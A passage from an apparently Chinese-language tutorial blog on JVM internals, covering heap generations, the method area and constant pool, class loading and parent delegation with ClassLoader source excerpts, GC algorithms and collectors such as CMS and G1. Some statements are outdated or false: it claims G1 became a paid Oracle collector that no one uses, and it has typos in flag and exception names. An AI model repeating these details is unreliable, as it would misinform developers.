为老年代与新生代的大小比值，默认为2：1； SurvivorRatio为新生代中Eden和Survivor的大小比值，默认为8：1 Edem : from : to = 8 :1 : 1 可以通过参数-XX:SurvivorRatio来设定，即： Eden = 8/10 的新生代空间大小，from = to = 1/10 的新生代空间大小。 JVM每次只会使用Eden和其中的一块Survivor区域来为对象服务，所以无论什么时候，总是有一块Survivor区域是空闲着的。 新生代实际可用的内存空间为 9/10 ( 即90%)的新生代空间。 Eden区 、From区 - Surivivor 0 、To 区 - Surivivor 1： 在未开始GC的时候，对象只会存在于Eden区和名为“From”的Survivor区，Survivor区“To”是空的。 紧接着进行GC，Eden区中所有存活的对象都会被复制到“To”，而在“From”区中，仍存活的对象会根据他们的年龄值来决定去向。 年龄达到一定值(年龄阈值，可以通过-XX:MaxTenuringThreshold来设置)的对象会被移动到年老代中，没有达到阈值的对象会被复制到“To”区域。经过这次GC后，Eden区和From区已经被清空。 这个时候，“From”和“To”会交换他们的角色，也就是新的“To”就是上次GC前的“From”，新的“From”就是上次GC前的“To”。不管怎样，都会保证名为To的Survivor区域是空的。 Minor GC会一直重复这样的过程，直到“To”区被填满，“To”区被填满之后，会将所有对象移动到年老代中。 老生代用于存放经过多次新生代GC仍然存活的对象，例如缓存对象，新建的对象也有可能直接进入老年代，主要有两种情况： 大对象，可通过启动参数设置-XX:PretenureSizeThreshold=1024(单位为字节，默认为0)来代表超过多大时就不在新生代分配，而是直接在老年代分配。 大的数组对象，且数组中无引用外部对象。 老年代所占的内存大小为-Xmx对应的值减去-Xmn对应的值。 如果在堆中没有内存完成实例分配，并且堆也无法再扩展时，将会抛出OutOfMemoryError异常。 永生代永久代可以简单理解为方法区（本质上两者并不等价） 如上文所说：对于习惯在HotSpot虚拟机上开发和部署程序的开发者来说，很多人愿意把方法区称为“永久代”，本质上两者并不等价。仅仅是因为HotSpot虚拟机的设计团队选择把GC分代收集扩展至方法区，或者说使用永久代来实现方法区而已。 对于其他虚拟机（如BEA JRockit、IBM J9等）来说是不存在永久代的概念的。 即使是HotSpot虚拟机本身，根据官方发布的路线图信息，现在也有放弃永久代并“搬家”至Native Memory来实现方法区的规划了： Jdk1.6及之前：常量池分配在永久代； Jdk1.7：有，但已经逐步“去永久代”； Jdk1.8及之后：没有永久代(java.lang.OutOfMemoryError: PermGen space,这种错误将不会出现在JDK1.8中)； 方法区（Method Area）各线程共享区域。 作用方法区保存内容：类信息、常量、静态变量、即时编译器编译后的代码等数据。 类信息具体内容： 类型信息：全限定名、直接超类的全限定名、类的类型还是接口类型、访问修饰符、直接超接口的全限定名的有序列表 字段信息：字段名、字段类型、字段的修饰符 方法信息：方法名、方法返回类型、方法参数的数量和类型（按照顺序）、方法的修饰符 其他信息：除了常量以外的所有类（静态）变量、一个指向ClassLoader的指针、一个指向Class对象的指针、常量池（常量数据以及对其他类型的符号引用） 介绍类型信息是由类加载器在类加载的过程中从类文件中提取出来的信息。 需要注意的一点是，常量池也存放于方法区中。 程序中所有的线程共享一个方法区，所以访问方法区的信息必须确保线程是安全的。如果有两个线程同时去加载一个类，那么只能有一个线程被允许去加载这个类，另一个必须等待。 在程序运行时，方法区的大小是可以改变的，程序在运行时可以扩展。 方法区也可以被垃圾回收，但条件非常严苛，必须在该类没有任何引用的情况下。 已装载类详细信息 运行时常量池：在方法区中，每个类型都对应一个常量池，存放该类型所用到的所有常量，常量池中存储了诸如文字字符串、final变量值、类名和方法名常量。 字段信息：字段信息存放类中声明的每一个字段的信息，包括字段的名、类型、修饰符。 字段名称：指的是类或接口的实例变量或类变量，字段的描述符是一个指示字段的类型的字符串，如private A a=null;则a为字段名，A为描述符，private为修饰符 方法信息：类中声明的每一个方法的信息，包括方法名、返回值类型、参数类型、修饰符、异常、方法的字节码。(在编译的时候，就已经将方法的局部变量、操作数栈大小等确定并存放在字节码中，在装载的时候，随着类一起装入方法区。) 静态变量：就是类变量，类的所有实例都共享，在方法区有个静态区，静态区专门存放静态变量和静态块。 到类classloader的引用：到该类的类装载器的引用。 到类class的引用：虚拟机为每一个被装载的类型创建一个class实例，用来代表这个被装载的类。 运行时常量池Java常量池实际上分为两种形态：静态常量池和运行时常量池。方法区Method Area包含运行时常量池。 静态常量池 ，即*.class文件中的常量池。class文件中的常量池不仅仅包含字符串(数字)字面量，还包含类、方法的信息，它们占用class文件绝大部分空间。 运行时常量池 ，则是jvm虚拟机在完成类装载操作后，将class文件中的常量池载入到内存中，并保存在方法区中，我们常说的常量池，就是指方法区中的运行时常量池。 运行时常量池（Constant Pool Table），用于存放编译期生成的各种字面量、符号引用，String字符串、final变量值、类和结构的完全限定名，方法的名称和描述符，字段的名称和描述符，这部分内容将在类加载后存放到方法区的运行时常量池中。它们以数组形式通过索引被访问，是外部调用与类联系及类型对象化的桥梁。 在运行时，JVM从常量池中获得符号引用，然后在运行时解析成引用项的实际地址，最后通过常量池中的全限定名、方法和字段描述符，把当前类或接口中的代码与其它类或接口中的代码联系起来。 运行时常量池中的常量，基本来源于各个class文件中的常量池。 程序运行时，除非手动向常量池中添加常量(比如调用intern方法)，否则jvm不会自动添加常量到常量池。 运行时常量池除了存放编译期产生的Class文件的常量外，还可存放在程序运行期间生成的新常量，比较常见增加新常量方法有String类的intern()方法。 String.intern()是一个Native方法，它的作用是：如果运行时常量池中已经包含一个等于此String对象内容的字符串，则返回常量池中该字符串的引用；如果没有，则在常量池中创建与此String内容相同的字符串，并返回常量池中创建的字符串的引用。 不过JDK7的intern()方法的实现有所不同，当常量池中没有该字符串时，不再是在常量池中创建与此String内容相同的字符串，而改为在常量池中记录堆中首次出现的该字符串的引用，并返回该引用。 由于运行时常量池在方法区中，我们可以通过JVM参数：-XX:PermSize、-XX:MaxPermSize来设置方法区大小，从而间接限制常量池大小。 在JDK8中，移除了方法区，转而用Metaspace区域替代，所以我们需要使用新的JVM参数：-XX:MaxMetaspaceSize 但是，JDK1.7之前运行时常量池是方法区的一部分，JDK1.7及之后版本已经将运行时常量池从方法区中移了出来，在堆（Heap）中开辟了一块区域存放运行时常量池。 0x04 类加载机制类加载简介基本概念类加载指的是将类的.class文件中的二进制数据读入到内存中，将其放在运行时数据区的方法区内，然后在堆区创建一个java.lang.Class对象，用来封装类在方法区内的数据结构。 所处环节在介绍类加载机制之前，先来看看，类的加载机制在整个Java程序运行期间处于一个什么环节，下面使用一张图来表示： 从上图可以看，Java文件通过编译器变成了.class文件，接下来类加载器又将这些.class文件加载到JVM中。其中类装载器的作用其实就是类的加载。 何时才会启动类加载器其实，类加载器并不需要等到某个类被“首次主动使用”时再加载它，JVM规范允许类加载器在预料某个类将要被使用时就预先加载它，如果在预先加载的过程中遇到了.class文件缺失或存在错误，类加载器必须在程序首次主动使用该类时才报告错误（LinkageError错误）。如果这个类一直没有被程序主动使用，那么类加载器就不会报告错误。 何处去加载.class文件在这里进行一个简单的分类。例举了5个来源: 本地磁盘 网上加载.class文件（Applet） 从数据库中 压缩文件中（ZAR，jar等） 从其他文件生成的（JSP应用） 类加载过程总过程类从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期包括：加载、验证、准备、解析、初始化、使用和卸载等七个阶段。它们的顺序如下图所示： 其中类加载的过程包括了加载、验证、准备、解析、初始化五个阶段。 在这五个阶段中，加载、验证、准备和初始化这四个阶段发生的顺序是确定的，而解析阶段则不一定，它在某些情况下可以在初始化阶段之后开始。 另外注意这里的几个阶段是按顺序开始，而不是按顺序进行或完成，因为这些阶段通常都是互相交叉地混合进行的，通常在一个阶段执行的过程中调用或激活另一个阶段。 启动时如果加上如下系统参数，即可跟踪JVM类的加载： 1-XX：+TraceClassLoading 加载”加载“是”类加载机制”的第一个过程，在加载阶段，虚拟机主要完成三件事： 通过一个类的全限定名来获取其定义的二进制字节流； 将这个字节流所代表的的静态存储结构转化为方法区的运行时数据结构； 在堆中生成一个代表这个类的Class对象，作为方法区中这些数据的访问入口。 相对于类加载的其他阶段而言，加载阶段是可控性最强的阶段，因为程序员可以使用系统的类加载器加载，还可以使用自己的类加载器加载。我们在最后一部分会详细介绍这个类加载器。在这里我们只需要知道类加载器的作用就是上面虚拟机需要完成的三件事，仅此而已就好了。 验证验证的主要作用就是确保被加载的类的正确性。也是连接阶段的第一步。说白了也就是我们加载好的.class文件不能对我们的虚拟机有危害，所以先检测验证一下。它主要是完成四个阶段的验证： 文件格式的验证：验证.class文件字节流是否符合class文件的格式的规范，并且能够被当前版本的虚拟机处理。这里面主要对魔数、主版本号、常量池等等的校验（魔数、主版本号都是.class文件里面包含的数据信息、在这里可以不用理解）。 元数据验证：主要是对字节码描述的信息进行语义分析，以保证其描述的信息符合Java语言规范的要求，比如说验证这个类是不是有父类，类中的字段方法是不是和父类冲突等等。 字节码验证：这是整个验证过程最复杂的阶段，主要是通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。在元数据验证阶段对数据类型做出验证后，这个阶段主要对类的方法做出分析，保证类的方法在运行时不会做出危害虚拟机安全的事。 符号引用验证：它是验证的最后一个阶段，发生在虚拟机将符号引用转化为直接引用的时候。主要是对类自身以外的信息进行校验。目的是确保解析动作能够完成。 对整个类加载机制而言，验证阶段是一个很重要但是非必需的阶段，如果我们的代码能够确保没有问题，那么我们就没有必要去验证，毕竟验证需要花费一定的的时间。当然我们可以使用-Xverfity:none来关闭大部分的验证。 准备准备阶段主要为类变量分配内存并设置初始值。这些内存都在方法区分配。在这个阶段我们只需要注意两点就好了，也就是类变量和初始值两个关键词： 类变量（static）会分配内存，但是实例变量不会，实例变量主要随着对象的实例化一块分配到Java堆中， 这里的初始值指的是数据类型默认值，而不是代码中被显示赋予的值。比如public static int value = 1; 在这里准备阶段过后的value值为0，而不是1。赋值为1的动作在初始化阶段。当然还有其他的默认值。 注意，在上面value是被static所修饰的准备阶段之后是0，但是如果同时被final和static修饰准备阶段之后就是1了。我们可以理解为static final在编译器就将结果放入调用它的类的常量池中了。 解析解析阶段主要是虚拟机将常量池中的符号引用转化为直接引用的过程。什么是符号应用和直接引用呢？ 符号引用：以一组符号来描述所引用的目标，可以是任何形式的字面量，只要是能无歧义的定位到目标就好，就好比在班级中，老师可以用张三来代表你，也可以用你的学号来代表你，但无论任何方式这些都只是一个代号（符号），这个代号指向你（符号引用） 直接引用：直接引用是可以指向目标的指针、相对偏移量或者是一个能直接或间接定位到目标的句柄。和虚拟机实现的内存有关，不同的虚拟机直接引用一般不同。 解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用点限定符7类符号引用进行。 初始化这是类加载机制的最后一步，在这个阶段，Java程序代码才开始真正执行。我们知道，在准备阶段已经为类变量赋过一次值。在初始化阶段，程序员可以根据自己的需求来赋值了。一句话描述这个阶段就是执行类构造器&lt; clinit &gt;()方法的过程。 在初始化阶段，主要为类的静态变量赋予正确的初始值，JVM负责对类进行初始化，主要对类变量进行初始化。在Java中对类变量进行初始值设定有两种方式： 声明类变量是指定初始值 使用静态代码块为类变量指定初始值 JVM初始化步骤 总的来说，初始化顺序依次是：（静态变量、静态初始化块）–&gt;（变量、初始化块）–&gt; 构造器；如果有父类，则顺序是：父类static方法 –&gt; 子类static方法 –&gt; 父类构造方法- -&gt; 子类构造方法 假如这个类还没有被加载和连接，则程序先加载并连接该类 假如该类的直接父类还没有被初始化，则先初始化其直接父类 假如类中有初始化语句，则系统依次执行这些初始化语句 类初始化时机 只有当对类的主动使用的时候才会导致类的初始化，类的主动使用包括以下六种： 创建类的实例，也就是new的方式 访问某个类或接口的静态变量，或者对该静态变量赋值 调用类的静态方法 反射（如Class.forName(&quot;com.shengsiyuan.Test&quot;)） 初始化某个类的子类，则其父类也会被初始化 Java虚拟机启动时被标明为启动类的类（ JavaTest），直接使用java.exe命令来运行某个主类 类加载器介绍类加载器的调用顺序如下： Java默认提供的三个ClassLoader：BootStrap ClassLoader、Extension ClassLoader、App ClassLoader 加载顺序：Bootstrap ClassLoader &gt; Extention ClassLoader &gt; App ClassLoader BootStrap ClassLoaderBootStrap ClassLoader被称为启动类加载器，是Java类加载层次中最顶层的类加载器，负责加载JDK中的核心类库，如：rt.jar、resources.jar、charsets.jar等，可通过如下程序获得该类加载器从哪些地方加载了相关的jar或class文件： 12345678910public class BootStrapTest&#123; public static void main(String[] args) &#123; URL[] urls = sun.misc.Launcher.getBootstrapClassPath().getURLs(); for (int i = 0; i &lt; urls.length; i++) &#123; System.out.println(urls[i].toExternalForm()); &#125; &#125;&#125; 上述代码查询结果可以通过查找 sun.boot.class.path 这个系统属性所得知的： 1System.out.println(System.getProperty(\"sun.boot.class.path\")); Extension ClassLoaderExtension ClassLoader，扩展类加载器，负责加载Java的扩展类库，Java虚拟机的实现会提供一个扩展库目录。该类加载器在此目录里面查找并加载 Java 类。默认加载JAVA_HOME/jre/lib/ext/目下的所有jar。 App ClassLoaderApp ClassLoader，系统类加载器，负责加载应用程序classpath目录下的所有jar和class文件。一般来说，Java应用的类都是由它来完成加载的。可以通过ClassLoader.getSystemClassLoader()来获取它。 Tomcat的类加载顺序如图： 双亲委托策略双亲委托策略内容ClassLoader使用的是双亲委托模型来搜索类的，每个ClassLoader实例都有一个父类加载器的引用（不是继承的关系，是一个包含的关系），虚拟机内置的类加载器（Bootstrap ClassLoader）本身没有父类加载器，但可以用作其它ClassLoader实例的的父类加载器。 当一个ClassLoader实例需要加载某个类时，它会试图亲自搜索某个类之前，先把这个任务委托给它的父类加载器，这个过程是由上至下依次检查的，首先由最顶层的类加载器Bootstrap ClassLoader试图加载，如果没加载到，则把任务转交给Extension ClassLoader试图加载，如果也没加载到，则转交给App ClassLoader 进行加载，如果它也没有加载得到的话，则返回给委托的发起者，由它到指定的文件系统或网络等URL中加载该类。 如果它们都没有加载到这个类时，则抛出ClassNotFoundException异常。否则将这个找到的类生成一个类的定义，并将它加载到内存当中，最后返回这个类在内存中的Class实例对象。 为什么使用双亲委托策略因为这样可以避免重复加载，当父亲已经加载了该类的时候，就没有必要子ClassLoader再加载一次。 考虑到安全因素，我们试想一下，如果不使用这种委托模式，那我们就可以随时使用自定义的String来动态替代Java核心API中定义的类型，这样会存在非常大的安全隐患。 而双亲委托的方式，就可以避免这种情况，因为String已经在启动时就被引导类加载器（Bootstrcp ClassLoader）加载，所以用户自定义的ClassLoader永远也无法加载一个自己写的String，除非你改变JDK中ClassLoader搜索类的默认算法。 JVM在搜索类的时候，如何判断两个class相同呢？JVM在判定两个class是否相同时，不仅要判断两个类名是否相同，而且要判断是否由同一个类加载器实例加载的。 只有两者同时满足的情况下，JVM才认为这两个class是相同的。就算两个class是同一份class字节码，如果被两个不同的ClassLoader实例所加载，JVM也会认为它们是两个不同class。 比如网络上的一个Java类org.classloader.simple.NetClassLoaderSimple，javac编译之后生成字节码文件NetClassLoaderSimple.class，ClassLoaderA和ClassLoaderB这两个类加载器并读取了NetClassLoaderSimple.class文件，并分别定义出了java.lang.Class实例来表示这个类。 对于JVM来说，它们是两个不同的实例对象，但它们确实是同一份字节码文件，如果试图将这个Class实例生成具体的对象进行转换时，就会抛运行时异常java.lang.ClassCaseException，提示这是两个不同的类型。 在一个单虚拟机环境下，标识一个类有两个因素：class的全路径名、该类的ClassLoader。 不遵循“双亲委托机制”的场景上面说了双亲委托机制主要是为了实现不同的ClassLoader之间加载的类的交互问题，被大家公用的类就交由父加载器去加载，但是Java中确实也存在父类加载器加载的类需要用到子加载器加载的类的情况。 Java中有一个SPI(Service Provider Interface)标准。 使用了SPI的库，比如JDBC、JNDI等，我们都知道JDBC需要第三方提供的驱动才可以，而驱动的jar包是放在我们应用程序本身的classpath的，而JDBC本身的API是JDK提供的一部分，它已经被bootstrap加载了，那第三方厂商提供的实现类怎么加载呢？ 这里面Java引入了线程上下文类加载的概念，线程类加载器默认会从父线程继承，如果没有指定的话，默认就是系统类加载器（App ClassLoader），这样的话当加载第三方驱动的时候，就可以通过线程的上下文类加载器来加载。 另外为了实现更灵活的类加载器OSGI以及一些Java app server也打破了双亲委托机制。 自定义ClassLoader看到Java为我们提供了三个类加载器，应用程序都是由这三种类加载器互相配合进行加载的，如果有必要，我们还可以加入自定义的类加载器。 如何自定义类加载以下两个步骤： 继承java.lang.ClassLoader； 覆写父类的findClass()方法； 几个关键的方法汇总 defineClass(byte[], int, int)：把字节数组b中的内容转换成 Java 类，返回的结果是java.lang.Class类的实例。这个方法被声明为final的； findClass(String name)：查找名称为name的类，返回的结果是java.lang.Class类的实例； loadClass(String name)：加载名称为name的类，返回的结果是java.lang.Class类的实例； resolveClass(Class&lt;?&gt;)：链接指定的 Java 类； 方法使用(1) loadClass()方法 方法定义： 1public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException 方法的实现： 123public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException&#123; return loadClass(name, false);&#125; 从上面可以看出loadClass方法调用了loadClass(name, false)方法，那么接下来我们再来看看另外一个loadClass()方法的实现： 123456789101112131415161718192021protected synchronized Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; // First, check if the class has already been loaded Class c = findLoadedClass(name);//检查class是否已经被加载过了 if (c == null)&#123; try&#123; if (parent != null)&#123; c = parent.loadClass(name, false); //如果没有被加载，且指定了父类加载器，则委托父加载器加载。 &#125; else &#123; c = findBootstrapClass0(name);//如果没有父类加载器，则委托bootstrap加载器加载&#125; &#125;catch (ClassNotFoundException e)&#123; // If still not found, then invoke findClass in order // to find the class. c = findClass(name);//如果父类加载没有加载到，则通过自己的findClass来加载。 &#125; &#125; if(resolve)&#123; resolveClass(c); &#125; return c;&#125; 上面的代码，通过注释可以清晰看出loadClass()的双亲委托机制是如何工作的。 这里我们需要注意一点就是public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException没有被标记为final，也就意味着我们是可以override这个方法的，也就是说双亲委托机制是可以打破的。另外上面注意到有个findClass()方法，接下来我们就来说说这个方法到底是做什么的。 (2) findClass()方法 我们查看java.lang.ClassLoader的源代码，我们发现findClass的实现如下： 123protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException&#123; throw new ClassNotFoundException(name);&#125; 我们可以看出此方法默认的实现是直接抛出异常，其实这个方法就是留给我们应用程序来override的。那么具体的实现就看你的实现逻辑了，你可以从磁盘读取，也可以从网络上获取class文件的字节流，获取class二进制了以后就可以交给defineClass来实现进一步的加载。defineClass我们在下面再来描述。 (3) defineClass方法 defineClass的代码如下： 123protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len) throws ClassFormatError&#123; return defineClass(name, b, off, len, null);&#125; 从上面的代码我们看出此方法被定义为了final，这也就意味着此方法不能被Override，其实这也是JVM留给我们的唯一的入口，通过这个唯一的入口，JVM保证了类文件必须符合Java虚拟机规范规定的类的定义。此方法最后会调用native的方法来实现真正的类的加载工作。 0x05 JVM垃圾回收机制GCJVM内存空间介绍在前面已经具体介绍过。 JVM的内存空间，从大的层面上来分析包含：新生代空间（Young）和老年代空间（Old）。新生代空间（Young）又被分为2个部分（Eden区域、Survivous区域）和3个板块（1个Eden区域和2个Survivous区域）。 下面来看下具体每部分都是用来干什么的： Eden(伊甸园)区域：用来存放使用new或者newInstance等方式创建的对象，默认这些对象都是存放在Eden区，除非这个对象太大，或者超出了设定的阈值-XX:PretenureSizeThresold，这样的对象会被直接分配到Old区域。 2个Survivous(幸存)区域：一般称为S0、S1，理论上一样大。 针对不同代的垃圾回收机制新生代（Young generation）绝大多数最新被创建的对象都会被分配到这里，由于大部分在创建后很快变得不可达，很多对象被创建在新生代，然后“消失”。对象从这个区域“消失”的过程我们称之为：Minor GC 。 老年代（Old generation）对象没有变得不可达，并且从新生代周期中存活了下来，会被拷贝到这里。其区域分配的空间要比新生代多。也正由于其相对大的空间，发生在老年代的GC次数要比新生代少得多。对象从老年代中消失的过程，称之为：Major GC或者Full GC。 持久代（Permanent generation）这个区域不是用于存储那些从老年代存活下来的对象，这个区域也可能发生GC。发生在这个区域的GC事件也被算为Major GC。只不过在这个区域发生GC的条件非常严苛，必须符合以下三种条件才会被回收： 所有实例被回收 加载该类的ClassLoader被回收 Class对象无法通过任何途径访问（包括反射） 第一次GC在不断创建对象的过程中，当Eden区域被占满，此时会开始做Young GC也叫Minor GC： 第一次GC时Survivous中S0区和S1区都为空，将其中一个作为To Survivor(用来存储Eden区域执行GC后不能被回收的对象)。比如：将S0作为To Survivor，则S1为From Survivor。 将Eden区域经过GC不能被回收的对象存储到To Survivor（S0）区域（此时Eden区域的内存会在垃圾回收的过程中全部释放），但如果To Survivor（S0）被占满了，Eden中剩下不能被回收对象只能存放到Old区域。 将Eden区域空间清空，此时From Survivous区域（S1）也是空的。 S0与S1互相切换标签，S0为From Survivor，S1为To Survivor。 第二次及之后的GC当第二次Eden区域被占满时，此时开始做GC： 将Eden和From Survivor(S0)中经过GC未被回收的对象迁移到To Survivor(S1)，如果To Survious(S1)区放不下，将剩下的不能回收对象放入Old区域； 将Eden区域空间和From Survivor（S0）区域空间清空； S0与S1互相切换标签，S0为To Survivor，S1为From Survivor。 第三、第四次依次类推，始终保证S0和S1有一个空的，用来存储临时对象，用于交换空间的目的。反反复复多次没有被淘汰的对象，将会被放入Old区域中，默认15次（由参数--XX:MaxTenuringThreshold=15决定）。 垃圾回收算法根搜索算法根搜索算法是从离散数学中的图论引入的，程序把所有引用关系看作一张图，从一个节点GC ROOT开始，寻找对应的引用节点，找到这个节点后，继续寻找这个节点的引用节点。当所有的引用节点寻找完毕后，剩余的节点则被认为是没有被引用到的节点，即无用的节点。 上图红色为无用的节点，可以被回收。 目前Java中可以作为GC ROOT的对象有： 虚拟机栈中引用的对象（本地变量表） 方法区中静态属性引用的对象 方法区中常量引用的对象 本地方法栈中引用的对象（Native对象） 基本所有GC算法都引用根搜索算法这种概念。 标记-清除算法标记-清除算法采用从根集合进行扫描，对存活的对象进行标记，标记完毕后，再扫描整个空间中未被标记的对象进行直接回收。 标记-清除算法不需要进行对象的移动，并且仅对不存活的对象进行处理，在存活的对象比较多的情况下极为高效，但由于标记-清除算法直接回收不存活的对象，并没有对还存活的对象进行整理，因此会导致内存碎片。 如图： 复制算法复制算法将内存划分为两个区间，使用此算法时，所有动态分配的对象都只能分配在其中一个区间（活动区间），而另外一个区间（空闲区间）则是空闲的。 复制算法采用从根集合扫描，将存活的对象复制到空闲区间，当扫描完毕活动区间后，会的将活动区间一次性全部回收。此时原本的空闲区间变成了活动区间。下次GC时候又会重复刚才的操作，依次循环。 复制算法在存活对象比较少的时候，极为高效，但是带来的成本是牺牲一半的内存空间用于进行对象的移动。所以复制算法的使用场景，必须是对象的存活率非常低才行，而且最重要的是，我们需要克服50%内存的浪费。 如图： 标记-整理算法标记-整理算法采用标记-清除算法一样的方式进行对象的标记、清除，但在回收不存活的对象占用的空间后，会将所有存活的对象往左端空闲空间移动，并更新对应的指针。 标记-整理算法是在标记-清除算法之上，又进行了对象的移动排序整理，因此成本更高，但却解决了内存碎片的问题。 JVM为了优化内存的回收，使用了分代回收的方式，对于新生代内存的回收（Minor GC）主要采用复制算法。而对于老年代的回收（Major GC），大多采用标记-整理算法。 如图： 垃圾回收器新生代收集器： Serial（-XX:+UseSerialGC） ParNew（-XX:+UseParNewGC） ParallelScavenge（-XX:+UseParallelGC） G1收集器 老年代收集器： SerialOld（-XX:+UseSerialOldGC） ParallelOld（-XX:+UseParallelOldGC） CMS（-XX:+UseConcMarkSweepGC） G1收集器 Serial（-XX:+UseSerialGC）从名字我们可以看出，这是一个串行收集器。 Serial收集器是Java虚拟机中最基本、历史最悠久的收集器。在JDK1.3之前是Java虚拟机新生代收集器的唯一选择。目前也是ClientVM下ServerVM 4核4GB以下机器默认垃圾回收器。Serial收集器并不是只能使用一个CPU进行收集，而是当JVM需要进行垃圾回收的时候，需暂停所有的用户线程，直到回收结束。 使用算法：复制算法 Serial收集器虽然是最老的，但是它对于限定单个CPU的环境来说，由于没有线程交互的开销，专心做垃圾收集，所以它在这种情况下是相对于其他收集器中最高效的。 JVM中文名称为Java虚拟机，因此它像一台虚拟的电脑在工作，而其中的每一个线程都被认为是JVM的一个处理器，因此图中的CPU0、CPU1实际上为用户的线程，而不是真正的机器CPU，不要误解哦。 SerialOld（-XX:+UseSerialGC）SerialOld是Serial收集器的老年代收集器版本，它同样是一个单线程收集器，这个收集器目前主要用于Client模式下使用。如果在Server模式下，它主要还有两大用途：一个是在JDK1.5及之前的版本中与Parallel Scavenge收集器搭配使用，另外一个就是作为CMS收集器的后备预案，如果CMS出现Concurrent Mode Failure，则SerialOld将作为后备收集器。 使用算法：标记-整理算法 运行示意图与上图一致。 ParNew（-XX:+UseParNewGC）ParNew收集器其实就是Serial收集器的多线程版本，除了使用多条线程进行垃圾收集之外，其余行为包括Serial收集器可用的所有控制参数、收集算法、Stop The World、对象分配规则、回收策略等都与Serial收集器完全一样，在实现上，这两种收集器也共用了相当多的代码。 应用场景：ParNew收集器是许多运行在Server模式下的虚拟机中首选的新生代收集器。有一个很重要的原因是除了Serial收集器外，目前只有它能与CMS收集器配合工作。 使用算法：复制算法 ParNew是许多运行在Server模式下的JVM首选的新生代收集器。但是在单CPU的情况下，它的效率远远低于Serial收集器，所以一定要注意使用场景。 ParallelScavenge（-XX:+UseParallelGC）ParallelScavenge又被称为吞吐量优先收集器，和ParNew 收集器类似，是一个新生代收集器。 使用算法：复制算法 ParallelScavenge收集器的目标是达到一个可控件的吞吐量，所谓吞吐量就是CPU用于运行用户代码的时间与CPU总消耗时间的比值，即吞吐量 = 运行用户代码时间 / （运行用户代码时间 + 垃圾收集时间）。 如果虚拟机总共运行了100分钟，其中垃圾收集花了1分钟，那么吞吐量就是99% 。 ParallelOld（-XX:+UseParallelOldGC）ParallelOld是并行收集器，和SerialOld一样，ParallelOld是一个老年代收集器，是老年代吞吐量优先的一个收集器。 这个收集器在JDK1.6之后才开始提供的，在此之前，ParallelScavenge只能选择SerialOld来作为其老年代的收集器，这严重拖累了ParallelScavenge整体的速度。而ParallelOld的出现后，“吞吐量优先”收集器才名副其实！ 使用算法：标记-整理算法 在注重吞吐量与CPU数量大于1的情况下，都可以优先考虑ParallelScavenge + ParalleloOld收集器。 CMS （-XX:+UseConcMarkSweepGC）CMS是一个老年代收集器，全称 Concurrent Low Pause Collector，是JDK1.4后期开始引用的新GC收集器，在JDK1.5、1.6中得到了进一步的改进。它是对于响应时间的重要性需求大于吞吐量要求的收集器。对于要求服务器响应速度高的情况下，使用CMS非常合适。 CMS的一大特点，就是用两次短暂的暂停来代替串行或并行标记整理算法时候的长暂停。 使用算法：标记-清理 CMS的执行过程CMS的执行过程如下： 初始标记（STW initial mark） 在这个阶段，需要虚拟机停顿正在执行的应用线程，官方的叫法STW（Stop Tow World）。这个过程从根对象扫描直接关联的对象，并作标记。这个过程会很快的完成。 并发标记（Concurrent marking） 这个阶段紧随初始标记阶段，在“初始标记”的基础上继续向下追溯标记。注意这里是并发标记，表示用户线程可以和GC线程一起并发执行，这个阶段不会暂停用户的线程哦。 并发预清理（Concurrent precleaning） 这个阶段任然是并发的，JVM查找正在执行“并发标记”阶段时候进入老年代的对象（可能这时会有对象从新生代晋升到老年代，或被分配到老年代）。通过重新扫描，减少在一个阶段“重新标记”的工作，因为下一阶段会STW。 重新标记（STW remark） 这个阶段会再次暂停正在执行的应用线程，重新重根对象开始查找并标记并发阶段遗漏的对象（在并发标记阶段结束后对象状态的更新导致），并处理对象关联。这一次耗时会比“初始标记”更长，并且这个阶段可以并行标记。 并发清理（Concurrent sweeping） 这个阶段是并发的，应用线程和GC清除线程可以一起并发执行。 并发重置（Concurrent reset） 这个阶段任然是并发的，重置CMS收集器的数据结构，等待下一次垃圾回收。 CMS的缺点 内存碎片。由于使用了 标记-清理 算法，导致内存空间中会产生内存碎片。不过CMS收集器做了一些小的优化，就是把未分配的空间汇总成一个列表，当有JVM需要分配内存空间的时候，会搜索这个列表找到符合条件的空间来存储这个对象。但是内存碎片的问题依然存在，如果一个对象需要3块连续的空间来存储，因为内存碎片的原因，寻找不到这样的空间，就会导致Full GC。 需要更多的CPU资源。由于使用了并发处理，很多情况下都是GC线程和应用线程并发执行的，这样就需要占用更多的CPU资源，也是牺牲了一定吞吐量的原因。 需要更大的堆空间。因为CMS标记阶段应用程序的线程还是执行的，那么就会有堆空间继续分配的问题，为了保障CMS在回收堆空间之前还有空间分配给新加入的对象，必须预留一部分空间。CMS默认在老年代空间使用68%时候启动垃圾回收。可以通过-XX:CMSinitiatingOccupancyFraction=n来设置这个阀值。 GarbageFirst（G1）这是一个新的垃圾回收器，既可以回收新生代也可以回收老年代。 SunHotSpot1.6u14以上EarlyAccess版本加入了这个回收器，Sun公司预期SunHotSpot1.7发布正式版本。通过重新划分内存区域，整合优化CMS，同时注重吞吐量和响应时间。杯具的是Oracle收购这个收集器之后将其用于商用收费版收集器。因此目前暂时没有发现哪个公司使用它。 G1收集器的运作大致可划分为以下几个步骤： 初始标记（Initial Marking）：初始标记阶段仅仅只是标记一下GC Roots能直接关联到的对象，并且修改TAMS（Next Top at Mark Start）的值，让下一阶段用户程序并发运行时，能在正确可用的Region中创建新对象，这阶段需要停顿线程，但耗时很短。 并发标记（Concurrent Marking）：并发标记阶段是从GC Root开始对堆中对象进行可达性分析，找出存活的对象，这阶段耗时较长，但可与用户程序并发执行。 最终标记（Final Marking）：最终标记阶段是为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程Remembered Set Logs里面，最终标记阶段需要把Remembered Set Logs的数据合并到Remembered Set中，这阶段需要停顿线程，但是可并行执行。 筛选回收（Live Data Counting and 